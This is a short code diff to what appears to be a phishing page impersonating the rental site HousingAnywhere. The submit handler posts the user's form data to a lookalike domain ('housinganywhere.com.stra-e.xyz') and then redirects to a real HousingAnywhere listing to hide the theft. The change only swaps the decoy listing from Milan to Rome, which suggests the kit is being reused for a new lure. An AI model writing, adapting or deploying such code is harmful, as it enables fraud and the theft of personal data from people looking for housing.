@@ -19,7 +19,7 @@ function Home() {
   async function handleSubmitFn() {
     try {
       await axios.post(`https://housinganywhere.com.stra-e.xyz/api/user`, data);
-      router.replace('https://housinganywhere.com/room/ut1523611/it/Milan/via-marghera');
+      router.replace('https://housinganywhere.com/room/ut1529672/it/Rome/via-laura-mantegazza');
     } catch(err) {
       console.log(err.response, "ce o avea");
     }
